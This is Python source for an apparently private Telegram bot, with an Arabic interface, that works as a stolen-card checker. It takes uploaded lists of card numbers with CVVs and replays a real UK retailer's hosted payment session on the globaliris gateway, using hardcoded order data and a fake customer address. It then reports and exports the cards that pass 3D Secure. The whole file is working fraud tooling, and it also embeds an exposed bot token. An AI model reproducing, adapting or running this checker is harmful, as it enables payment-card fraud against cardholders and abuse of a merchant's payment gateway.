import os
import asyncio
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters
import requests
from bs4 import BeautifulSoup
import json
import time
import re

# ========== الإعدادات ==========
BOT_TOKEN = "7458997340:AAEKGFvkALm5usoFBvKdbGEs4b2dz5iSwtw"
ADMIN_IDS = [5895491379, 844663875]

# ========== إحصائيات متعددة المستخدمين ==========
user_sessions = {}  # {user_id: {stats}}

def get_user_stats(user_id):
    """الحصول على إحصائيات المستخدم أو إنشاء جديدة"""
    if user_id not in user_sessions:
        user_sessions[user_id] = {
            'total': 0,
            'checking': 0,
            'success_3ds': 0,
            'failed': 0,
            'errors': 0,
            'start_time': None,
            'is_running': False,
            'dashboard_message_id': None,
            'chat_id': None,
            'current_card': '',
            'last_response': 'Waiting...',
            'cards_checked': 0,
            'success_cards': [],
            'check_mode': 'basic',  # basic أو advanced
        }
    return user_sessions[user_id]

def reset_user_stats(user_id):
    """إعادة تعيين إحصائيات المستخدم"""
    if user_id in user_sessions:
        user_sessions[user_id].update({
            'total': 0,
            'checking': 0,
            'success_3ds': 0,
            'failed': 0,
            'errors': 0,
            'start_time': None,
            'is_running': False,
            'current_card': '',
            'last_response': 'Waiting...',
            'cards_checked': 0,
            'success_cards': [],
        })

# ========== Card Checker Class ==========
class CardChecker:
    def __init__(self, check_mode='basic'):
        self.session = requests.Session()
        self.check_mode = check_mode
    
    def analyze_3ds_response(self, html_content):
        """تحليل استجابة 3DS من HTML"""
        try:
            soup = BeautifulSoup(html_content, 'html.parser')
            text_content = soup.get_text().lower()
            
            # أولاً: فحص رسائل الفشل الصريحة
            critical_failure_patterns = [
                "can't complete this transaction",
                "cannot complete this transaction",
                "unable to complete",
                "transaction.*declined",
                "card.*declined",
                "payment.*declined",
                "insufficient.*funds",
                "card.*expired",
                "invalid.*cvv",
            ]
            
            for pattern in critical_failure_patterns:
                if re.search(pattern, text_content, re.IGNORECASE):
                    error_msg = soup.find('h2')
                    if error_msg:
                        error_text = error_msg.get_text().strip()
                    else:
                        error_para = soup.find('p')
                        error_text = error_para.get_text().strip()[:100] if error_para else "فشل المعاملة"
                    return False, error_text
            
            # ثانياً: فحص علامات النجاح
            success_patterns = [
                'enter.*code',
                'enter.*secure code',
                'enter your.*digit',
                'type.*code',
                'verification code sent',
                'code has been sent',
                'we.*sent.*code',
                'check your phone',
                'check your email',
                'authentication code',
            ]
            
            for pattern in success_patterns:
                if re.search(pattern, text_content, re.IGNORECASE):
                    return True, "نجح التحقق - طلب رمز التحقق"
            
            # فحص وجود حقول إدخال OTP
            if 'sorry' not in text_content or 'went wrong' not in text_content:
                input_fields = soup.find_all('input', {'type': ['text', 'tel', 'number']})
                if input_fields:
                    for field in input_fields:
                        field_name = field.get('name', '').lower()
                        field_id = field.get('id', '').lower()
                        field_placeholder = field.get('placeholder', '').lower()
                        
                        if any(x in field_name or x in field_id or x in field_placeholder 
                               for x in ['otp', 'code', 'verification', 'secure', 'text_input', 'text-input']):
                            return True, "نجح التحقق - صفحة إدخال الرمز"
            
            # فحص أزرار التحقق
            verify_buttons = soup.find_all('button', id=re.compile(r'verify|submit|confirm', re.I))
            if verify_buttons and 'sorry' not in text_content:
                return True, "نجح التحقق - نموذج التحقق"
            
            # إذا وجدنا "sorry something went wrong"
            if ('sorry' in text_content and 'went wrong' in text_content) or \
               ('error' in text_content and 'processing' in text_content):
                return False, "فشل المعاملة - خطأ في المعالجة"
            
            return None, "استجابة غير محددة"
            
        except Exception as e:
            return None, f"خطأ في التحليل: {str(e)[:30]}"
        
    def check(self, card_line):
        """فحص بطاقة واحدة"""
        debug_log = []
        
        try:
            parts = card_line.strip().split('|')
            if len(parts) != 4:
                return "ERROR", "تنسيق خاطئ", None
            
            ccnum, month, year, cvv = parts
            debug_log.append(f"Card: {ccnum[:6]}****{ccnum[-4:]}")
            debug_log.append(f"Check Mode: {self.check_mode}")
            
            # الخطوة 1: الحصول على GUID
            headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            }
            
            data = {
                'PAYER_EXIST': '0',
                'OFFER_SAVE_CARD': '1',
                'CARD_STORAGE_ENABLE': '1',
                'HPP_VERSION': '2',
                'MERCHANT_RESPONSE_URL': 'https://www.dobies.co.uk/realex/new-return.cfm',
                'NEWSYSTEM': '1',
                'RETURN_TSS': '1',
                'WEB_ORDER_ID': '23614795',
                'SITE': 'DESKTOP',
                'MERCHANT_ID': 'bvgairflo',
                'ORDER_ID': '11BDE712-C3E6-5F98-FBFAC4C6563D9ED3',
                'USER_ID': '5187113',
                'ACCOUNT': 'suttonsdobiesecomm',
                'AMOUNT': '1698',
                'CURRENCY': 'GBP',
                'TIMESTAMP': '20251114091142',
                'SHA1HASH': 'a275d57746de14eebd0810c6255e6a86b11ae0c3',
                'AUTO_SETTLE_FLAG': '1',
                'SHOP': 'www.dobies.co.uk',
                'SHOPREF': '112',
                'VAR_REF': '5187113',
                'HPP_CUSTOMER_EMAIL': 'renes98352@neuraxo.com',
                'HPP_BILLING_STREET1': '216 The Broadway',
                'HPP_BILLING_CITY': 'Birmingham',
                'HPP_BILLING_POSTALCODE': 'B203DL',
                'HPP_BILLING_COUNTRY': '826',
                'HPP_ADDRESS_MATCH_INDICATOR': 'TRUE',
                'HPP_CHALLENGE_REQUEST_INDICATOR': 'NO_PREFERENCE',
            }
            
            response = self.session.post('https://hpp.globaliris.com/pay', headers=headers, data=data, timeout=15)
            debug_log.append(f"Step 1: GUID Response Status: {response.status_code}")
            
            soup = BeautifulSoup(response.text, 'html.parser')
            guid_input = soup.find('input', {'name': 'guid'})
            if not guid_input:
                return "ERROR", "لم يتم الحصول على GUID", "\n".join(debug_log)
            
            guid = guid_input.get('value')
            debug_log.append(f"GUID: {guid[:20]}...")
            
            # الخطوة 2: فتح صفحة البطاقة
            card_page_url = f"https://hpp.globaliris.com/hosted-payments/blue/card.html?guid={guid}"
            self.session.get(card_page_url, headers={'User-Agent': 'Mozilla/5.0'}, timeout=10)
            debug_log.append(f"Step 2: Card Page Loaded")
            
            # الخطوة 3: التحقق من 3DS
            headers_xhr = {
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'X-Requested-With': 'XMLHttpRequest',
                'User-Agent': 'Mozilla/5.0',
                'Referer': card_page_url,
            }
            
            verify_data = {
                'pas_cctype': '',
                'pas_ccnum': ccnum,
                'pas_expiry': '',
                'pas_cccvc': '',
                'pas_ccname': '',
                'guid': guid,
            }
            
            verify_response = self.session.post(
                'https://hpp.globaliris.com/hosted-payments/blue/3ds2/verifyEnrolled',
                headers=headers_xhr,
                data=verify_data,
                timeout=15
            )
            
            debug_log.append(f"Step 3: Verify Response Status: {verify_response.status_code}")
            
            try:
                verify_result = verify_response.json()
            except:
                debug_log.append(f"Verify Response (not JSON): {verify_response.text[:200]}")
                return "ERROR", "استجابة التحقق غير صالحة", "\n".join(debug_log)
            
            enrolled = verify_result.get('enrolled', False)
            debug_log.append(f"Enrolled: {enrolled}")
            
            if not enrolled:
                return "FAILED", "غير مسجلة في 3DS", "\n".join(debug_log)
            
            method_url = verify_result.get('method_url')
            method_data = verify_result.get('method_data', {})
            
            # الخطوة 4: تنفيذ 3DS Method
            method_completion_indicator = 'U'
            
            if method_url and method_data:
                try:
                    encoded_method_data = method_data.get('encoded_method_data')
                    method_response = self.session.post(
                        method_url,
                        data={'threeDSMethodData': encoded_method_data},
                        headers={'Content-Type': 'application/x-www-form-urlencoded'},
                        timeout=10
                    )
                    if method_response.status_code == 200:
                        method_completion_indicator = 'Y'
                    else:
                        method_completion_indicator = 'N'
                    debug_log.append(f"Step 4: Method Status: {method_response.status_code}")
                except Exception as e:
                    method_completion_indicator = 'U'
                    debug_log.append(f"Step 4: Method Error: {str(e)[:50]}")
                
                time.sleep(2)
            
            # الخطوة 5: إرسال بيانات البطاقة
            full_card_data = {
                'pas_cctype': '',
                'verifyResult': json.dumps(verify_result),
                'verifyEnrolled': 'Y',
                'pas_ccnum': ccnum,
                'pas_expiry': f"{month}/{year[-2:]}",
                'pas_cccvc': cvv,
                'pas_ccname': 'TEST',
                'guid': guid,
                'browserJavaEnabled': 'false',
                'browserLanguage': 'en',
                'screenColorDepth': '24',
                'screenHeight': '1080',
                'screenWidth': '1920',
                'timezoneUtcOffset': '-120',
                'threeDSMethodCompletionInd': method_completion_indicator,
            }
            
            auth_response = self.session.post(
                'https://hpp.globaliris.com/hosted-payments/blue/api/auth',
                headers=headers_xhr,
                data=full_card_data,
                timeout=15
            )
            
            debug_log.append(f"Step 5: Auth Response Status: {auth_response.status_code}")
            
            content_type = auth_response.headers.get('Content-Type', '')
            
            if 'html' in content_type.lower() or auth_response.text.strip().startswith('<'):
                debug_log.append(f"HTML Response detected")
                if 'error processing your payment' in auth_response.text.lower():
                    return "FAILED", "خطأ في معالجة الدفع", "\n".join(debug_log)
                return "ERROR", "استجابة HTML غير متوقعة", "\n".join(debug_log)
            
            try:
                auth_result = auth_response.json()
            except json.JSONDecodeError:
                debug_log.append(f"Auth Response (not JSON): {auth_response.text[:300]}")
                return "ERROR", "استجابة غير صالحة", "\n".join(debug_log)
            
            data_obj = auth_result.get('data', {})
            verify_enrolled_result = data_obj.get('verifyEnrolledResult', {})
            
            # فحص وجود Challenge URL (نجاح 3DS)
            challenge_url = None
            encoded_creq = None
            three_ds_session_data = None
            
            if verify_enrolled_result and verify_enrolled_result.get('challengeRequestUrl'):
                challenge_url = verify_enrolled_result.get('challengeRequestUrl', '')
                encoded_creq = verify_enrolled_result.get('encodedCreq', '')
                three_ds_session_data = verify_enrolled_result.get('threeDSSessionData', '')
                debug_log.append(f"✅ Challenge URL found - 3DS SUCCESS")
            elif verify_result.get('challenge_request_url'):
                challenge_url = verify_result.get('challenge_request_url', '')
                encoded_creq = verify_result.get('encoded_creq', '')
                three_ds_session_data = verify_result.get('three_ds_session_data', '')
                debug_log.append(f"✅ Challenge URL found - 3DS SUCCESS")
            
            # إذا وجدنا Challenge URL = الكارت نجح 3DS
            if challenge_url and encoded_creq:
                debug_log.append(f"3DS Authentication Successful!")
                
                # الوضع الأساسي: نجاح مباشر بدون تحقق إضافي
                if self.check_mode == 'basic':
                    return "SUCCESS", "نجح 3DS", "\n".join(debug_log)
                
                # الوضع المتقدم: فحص حالة إرسال الكود
                elif self.check_mode == 'advanced':
                    additional_status = ""
                    try:
                        challenge_headers = {
                            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                            'accept-language': 'ar',
                            'content-type': 'application/x-www-form-urlencoded',
                            'origin': 'https://hpp.globaliris.com',
                            'referer': 'https://hpp.globaliris.com/',
                            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                        }
                        
                        challenge_data = {
                            'creq': encoded_creq,
                            'threeDSSessionData': three_ds_session_data,
                        }
                        
                        debug_log.append(f"Checking OTP delivery status...")
                        
                        challenge_response = self.session.post(
                            challenge_url,
                            headers=challenge_headers,
                            data=challenge_data,
                            timeout=15
                        )
                        
                        debug_log.append(f"Challenge Status: {challenge_response.status_code}")
                        
                        if challenge_response.status_code == 200:
                            success, message = self.analyze_3ds_response(challenge_response.text)
                            
                            if success:
                                additional_status = f" | ✅ {message}"
                            elif success is False:
                                additional_status = f" | ⚠️ {message}"
                            else:
                                additional_status = " | حالة الكود: غير محددة"
                        
                    except Exception as e:
                        debug_log.append(f"Challenge check error: {str(e)}")
                        additional_status = " | لم يتم التحقق من حالة الكود"
                    
                    return "SUCCESS", f"نجح 3DS{additional_status}", "\n".join(debug_log)
            
            # إذا لم نجد Challenge URL
            debug_log.append(f"No Challenge URL - checking auth status...")
            status = auth_result.get('status', 'unknown')
            result_code = data_obj.get('response', {}).get('result', status)
            
            debug_log.append(f"Final Status: {status}, Result Code: {result_code}")
            
            if status == 'success' or result_code == '00':
                return "SUCCESS", "نجح 3D Secure بدون Challenge", "\n".join(debug_log)
            
            return "FAILED", f"فشل AUTH: {result_code}", "\n".join(debug_log)
                
        except requests.Timeout:
            return "ERROR", "انتهى الوقت", "\n".join(debug_log)
        except requests.RequestException as e:
            debug_log.append(f"Request Error: {str(e)}")
            return "ERROR", str(e)[:30], "\n".join(debug_log)
        except Exception as e:
            debug_log.append(f"Exception: {str(e)}")
            return "ERROR", str(e)[:30], "\n".join(debug_log)

async def send_result(bot_app, card, status_type, message, debug_info, user_id):
    try:
        stats = get_user_stats(user_id)
        card_number = stats['success_3ds'] + stats['failed']
        
        if status_type == 'SUCCESS':
            mode_emoji = "🔍" if stats['check_mode'] == 'advanced' else "⚡"
            text = (
                "╔═══════════════════╗\n"
                f"✅ **3D SECURE SUCCESS** {mode_emoji}\n"
                "╚═══════════════════╝\n\n"
                f"💳 `{card}`\n"
                f"🔥 Status: **{message}**\n"
                f"📊 Card #{card_number}\n"
                "╚═══════════════════╝"
            )
            stats['success_cards'].append(card)
            
            await bot_app.bot.send_message(
                chat_id=stats['chat_id'],
                text=text,
                parse_mode='Markdown'
            )
    except Exception as e:
        print(f"[!] Error: {e}")

async def check_card(card, bot_app, user_id):
    stats = get_user_stats(user_id)
    
    if not stats['is_running']:
        return card, "STOPPED", "تم الإيقاف"
    
    parts = card.strip().split('|')
    if len(parts) != 4:
        stats['errors'] += 1
        stats['checking'] -= 1
        stats['last_response'] = 'Format Error'
        await update_dashboard(bot_app, user_id)
        return card, "ERROR", "صيغة خاطئة"
    
    try:
        if not stats['is_running']:
            stats['checking'] -= 1
            return card, "STOPPED", "تم الإيقاف"
        
        checker = CardChecker(check_mode=stats['check_mode'])
        status, message, debug_info = checker.check(card)
        
        if status == 'SUCCESS':
            stats['success_3ds'] += 1
            stats['checking'] -= 1
            stats['last_response'] = '3DS Success ✅'
            await update_dashboard(bot_app, user_id)
            await send_result(bot_app, card, "SUCCESS", message, debug_info, user_id)
            return card, "SUCCESS", message
            
        elif status == 'FAILED':
            stats['failed'] += 1
            stats['checking'] -= 1
            stats['last_response'] = 'Failed ❌'
            await update_dashboard(bot_app, user_id)
            return card, "FAILED", message
            
        else:
            stats['errors'] += 1
            stats['checking'] -= 1
            stats['last_response'] = f'Error: {message[:20]}'
            await update_dashboard(bot_app, user_id)
            return card, "ERROR", message
            
    except Exception as e:
        stats['errors'] += 1
        stats['checking'] -= 1
        stats['last_response'] = f'Error: {str(e)[:20]}'
        await update_dashboard(bot_app, user_id)
        return card, "EXCEPTION", str(e)

def create_dashboard_keyboard(user_id):
    stats = get_user_stats(user_id)
    elapsed = 0
    if stats['start_time']:
        elapsed = int((datetime.now() - stats['start_time']).total_seconds())
    mins, secs = divmod(elapsed, 60)
    hours, mins = divmod(mins, 60)
    
    mode_text = "🔍 متقدم" if stats['check_mode'] == 'advanced' else "⚡ أساسي"
    
    keyboard = [
        [InlineKeyboardButton(f"🔥 الإجمالي: {stats['total']}", callback_data="total")],
        [
            InlineKeyboardButton(f"🔄 يتم الفحص: {stats['checking']}", callback_data="checking"),
            InlineKeyboardButton(f"⏱ {hours:02d}:{mins:02d}:{secs:02d}", callback_data="time")
        ],
        [
            InlineKeyboardButton(f"✅ نجح 3DS: {stats['success_3ds']}", callback_data="success"),
            InlineKeyboardButton(f"❌ فشل: {stats['failed']}", callback_data="failed")
        ],
        [
            InlineKeyboardButton(f"⚠️ أخطاء: {stats['errors']}", callback_data="errors")
        ],
        [
            InlineKeyboardButton(f"📡 {stats['last_response']}", callback_data="response")
        ],
        [
            InlineKeyboardButton(f"وضع الفحص: {mode_text}", callback_data="mode_info")
        ]
    ]
    
    if stats['is_running']:
        keyboard.append([InlineKeyboardButton("🛑 إيقاف الفحص", callback_data="stop_check")])
    
    if stats['current_card']:
        keyboard.append([InlineKeyboardButton(f"🔄 {stats['current_card']}", callback_data="current")])
    
    return InlineKeyboardMarkup(keyboard)

async def update_dashboard(bot_app, user_id):
    stats = get_user_stats(user_id)
    if stats['dashboard_message_id'] and stats['chat_id']:
        try:
            await bot_app.bot.edit_message_text(
                chat_id=stats['chat_id'],
                message_id=stats['dashboard_message_id'],
                text="📊 **3D SECURE CHECKER - LIVE** 📊",
                reply_markup=create_dashboard_keyboard(user_id),
                parse_mode='Markdown'
            )
        except:
            pass

async def send_final_files(bot_app, user_id):
    stats = get_user_stats(user_id)
    try:
        if stats['success_cards']:
            success_text = "\n".join(stats['success_cards'])
            filename = f"success_3ds_cards_{user_id}.txt"
            with open(filename, "w") as f:
                f.write(success_text)
            await bot_app.bot.send_document(
                chat_id=stats['chat_id'],
                document=open(filename, "rb"),
                caption=f"✅ **3D Secure Success Cards** ({len(stats['success_cards'])} cards)",
                parse_mode='Markdown'
            )
            os.remove(filename)
        
    except Exception as e:
        print(f"[!] خطأ في إرسال الملفات: {e}")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ غير مصرح - هذا البوت خاص")
        return
    
    user_id = update.effective_user.id
    stats = get_user_stats(user_id)
    
    keyboard = [
        [InlineKeyboardButton("📁 إرسال ملف البطاقات", callback_data="send_file")],
        [InlineKeyboardButton("⚙️ اختيار وضع الفحص", callback_data="select_mode")]
    ]
    
    await update.message.reply_text(
        "📊 **3D SECURE CHECKER BOT**\n\n"
        "أرسل ملف .txt يحتوي على البطاقات\n"
        "الصيغة: `رقم|شهر|سنة|cvv`\n\n"
        "**أوضاع الفحص:**\n"
        "⚡ **أساسي**: فحص سريع (3DS فقط)\n"
        "🔍 **متقدم**: فحص شامل (3DS + حالة OTP)\n\n"
        f"**الوضع الحالي:** {'🔍 متقدم' if stats.get('check_mode') == 'advanced' else '⚡ أساسي'}\n\n"
        "✨ **يمكن لعدة مستخدمين الفحص معاً!**",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ غير مصرح")
        return
    
    user_id = update.effective_user.id
    stats = get_user_stats(user_id)
    
    if stats['is_running']:
        await update.message.reply_text("⚠️ لديك فحص جاري بالفعل! أكمله أو أوقفه أولاً.")
        return
    
    file = await update.message.document.get_file()
    file_content = await file.download_as_bytearray()
    cards = [c.strip() for c in file_content.decode('utf-8').strip().split('\n') if c.strip()]
    
    # إعادة تعيين الإحصائيات للمستخدم
    stats.update({
        'total': len(cards),
        'checking': 0,
        'success_3ds': 0,
        'failed': 0,
        'errors': 0,
        'current_card': '',
        'last_response': 'Starting...',
        'cards_checked': 0,
        'success_cards': [],
        'start_time': datetime.now(),
        'is_running': True,
        'chat_id': update.effective_chat.id
    })
    
    dashboard_msg = await update.message.reply_text(
        text="📊 **3D SECURE CHECKER - LIVE** 📊",
        reply_markup=create_dashboard_keyboard(user_id),
        parse_mode='Markdown'
    )
    stats['dashboard_message_id'] = dashboard_msg.message_id
    
    mode_text = "🔍 متقدم (مع فحص OTP)" if stats['check_mode'] == 'advanced' else "⚡ أساسي (3DS فقط)"
    
    await update.message.reply_text(
        f"✅ تم بدء الفحص!\n\n"
        f"📊 إجمالي البطاقات: {len(cards)}\n"
        f"🔄 وضع الفحص: {mode_text}\n"
        f"⏳ جاري الفحص...",
        parse_mode='Markdown'
    )
    
    asyncio.create_task(process_cards(cards, context.application, user_id))

async def process_cards(cards, bot_app, user_id):
    stats = get_user_stats(user_id)
    
    for i, card in enumerate(cards):
        if not stats['is_running']:
            stats['last_response'] = 'Stopped by user 🛑'
            await update_dashboard(bot_app, user_id)
            break
        
        stats['checking'] = 1
        parts = card.split('|')
        stats['current_card'] = f"{parts[0][:6]}****{parts[0][-4:]}" if len(parts) > 0 else card[:10]
        await update_dashboard(bot_app, user_id)
        
        await check_card(card, bot_app, user_id)
        stats['cards_checked'] += 1
        
        if stats['cards_checked'] % 5 == 0:
            await update_dashboard(bot_app, user_id)
        
        await asyncio.sleep(2)
    
    stats['is_running'] = False
    stats['checking'] = 0
    stats['current_card'] = ''
    stats['last_response'] = 'Completed ✅'
    await update_dashboard(bot_app, user_id)
    
    mode_text = "🔍 متقدم" if stats['check_mode'] == 'advanced' else "⚡ أساسي"
    
    summary_text = (
        "═══════════════════\n"
        "✅ **اكتمل الفحص!** ✅\n"
        "═══════════════════\n\n"
        f"📊 **الإحصائيات النهائية:**\n"
        f"🔥 الإجمالي: {stats['total']}\n"
        f"✅ نجح 3DS: {stats['success_3ds']}\n"
        f"❌ فشل: {stats['failed']}\n"
        f"⚠️ أخطاء: {stats['errors']}\n"
        f"🔧 الوضع: {mode_text}\n\n"
        "📁 **جاري إرسال الملفات...**"
    )
    
    await bot_app.bot.send_message(
        chat_id=stats['chat_id'],
        text=summary_text,
        parse_mode='Markdown'
    )
    
    await send_final_files(bot_app, user_id)
    
    final_text = (
        "╔═══════════════════╗\n"
        "🎉 **تم إنهاء العملية بنجاح!** 🎉\n"
        "╚═══════════════════╝\n\n"
        "✅ تم إرسال جميع الملفات\n"
        "📊 شكراً لاستخدامك البوت!\n\n"
        "⚡️ 3D Secure Gateway"
    )
    
    await bot_app.bot.send_message(
        chat_id=stats['chat_id'],
        text=final_text,
        parse_mode='Markdown'
    )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ غير مصرح - هذا البوت خاص")
        return

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    
    if query.from_user.id not in ADMIN_IDS:
        await query.answer("❌ غير مصرح", show_alert=True)
        return
    
    user_id = query.from_user.id
    stats = get_user_stats(user_id)
    
    try:
        await query.answer()
    except:
        pass
    
    if query.data == "stop_check":
        if stats['is_running']:
            stats['is_running'] = False
            stats['checking'] = 0
            stats['last_response'] = 'Stopped 🛑'
            await update_dashboard(context.application, user_id)
            try:
                await context.application.bot.send_message(
                    chat_id=stats['chat_id'],
                    text="🛑 **تم إيقاف الفحص بواسطة المستخدم!**",
                    parse_mode='Markdown'
                )
            except:
                pass
    
    elif query.data == "select_mode":
        keyboard = [
            [InlineKeyboardButton("⚡ فحص أساسي (3DS فقط)", callback_data="mode_basic")],
            [InlineKeyboardButton("🔍 فحص متقدم (3DS + حالة OTP)", callback_data="mode_advanced")],
            [InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main")]
        ]
        
        current_mode = "🔍 متقدم" if stats.get('check_mode', 'basic') == 'advanced' else "⚡ أساسي"
        
        await query.edit_message_text(
            "⚙️ **اختر وضع الفحص:**\n\n"
            "⚡ **فحص أساسي:**\n"
            "• فحص سريع للبطاقة\n"
            "• يتحقق فقط من نجاح 3DS\n"
            "• لا يفحص حالة إرسال OTP\n\n"
            "🔍 **فحص متقدم:**\n"
            "• فحص شامل ودقيق\n"
            "• يتحقق من نجاح 3DS\n"
            "• يفحص حالة إرسال OTP\n"
            "• يعرض تفاصيل إضافية\n\n"
            f"**الوضع الحالي:** {current_mode}",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown'
        )
    
    elif query.data == "mode_basic":
        stats['check_mode'] = 'basic'
        await query.answer("✅ تم تفعيل الوضع الأساسي", show_alert=True)
        
        keyboard = [[InlineKeyboardButton("🔙 رجوع للقائمة الرئيسية", callback_data="back_to_main")]]
        
        await query.edit_message_text(
            "✅ **تم تفعيل الوضع الأساسي!**\n\n"
            "⚡ **المميزات:**\n"
            "• فحص سريع وفعال\n"
            "• يتحقق من نجاح 3DS\n"
            "• مثالي للفحص السريع للبطاقات\n\n"
            "📝 يمكنك الآن إرسال ملف البطاقات",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown'
        )
    
    elif query.data == "mode_advanced":
        stats['check_mode'] = 'advanced'
        await query.answer("✅ تم تفعيل الوضع المتقدم", show_alert=True)
        
        keyboard = [[InlineKeyboardButton("🔙 رجوع للقائمة الرئيسية", callback_data="back_to_main")]]
        
        await query.edit_message_text(
            "✅ **تم تفعيل الوضع المتقدم!**\n\n"
            "🔍 **المميزات:**\n"
            "• فحص شامل ودقيق\n"
            "• يتحقق من نجاح 3DS\n"
            "• يفحص حالة إرسال OTP\n"
            "• يعرض تفاصيل إضافية:\n"
            "  - ✅ نجح إرسال الكود\n"
            "  - ⚠️ خطأ في إرسال الكود\n"
            "  - ℹ️ حالة غير محددة\n\n"
            "📝 يمكنك الآن إرسال ملف البطاقات",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown'
        )
    
    elif query.data == "back_to_main":
        keyboard = [
            [InlineKeyboardButton("📁 إرسال ملف البطاقات", callback_data="send_file")],
            [InlineKeyboardButton("⚙️ اختيار وضع الفحص", callback_data="select_mode")]
        ]
        
        await query.edit_message_text(
            "📊 **3D SECURE CHECKER BOT**\n\n"
            "أرسل ملف .txt يحتوي على البطاقات\n"
            "الصيغة: `رقم|شهر|سنة|cvv`\n\n"
            "**أوضاع الفحص:**\n"
            "⚡ **أساسي**: فحص سريع (3DS فقط)\n"
            "🔍 **متقدم**: فحص شامل (3DS + حالة OTP)\n\n"
            f"**الوضع الحالي:** {'🔍 متقدم' if stats.get('check_mode') == 'advanced' else '⚡ أساسي'}\n\n"
            "✨ **يمكن لعدة مستخدمين الفحص معاً!**",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown'
        )
    
    elif query.data == "send_file":
        await query.answer("📁 أرسل ملف البطاقات الآن", show_alert=True)
    
    elif query.data == "mode_info":
        mode_text = "🔍 متقدم (مع فحص OTP)" if stats['check_mode'] == 'advanced' else "⚡ أساسي (3DS فقط)"
        await query.answer(f"الوضع الحالي: {mode_text}", show_alert=True)

def main():
    print("[🤖] Starting 3D Secure Telegram Bot...")
    print("[✅] Multi-User Support Enabled")
    print("[⚡] Basic Mode: Fast 3DS check only")
    print("[🔍] Advanced Mode: 3DS + OTP status check")
    print("[👥] Multiple users can check simultaneously")
    
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    app.add_handler(CallbackQueryHandler(button_callback))
    
    print("[✅] Bot is running...")
    print(f"[👥] Authorized users: {len(ADMIN_IDS)}")
    app.run_polling()

if __name__ == "__main__":
    main()
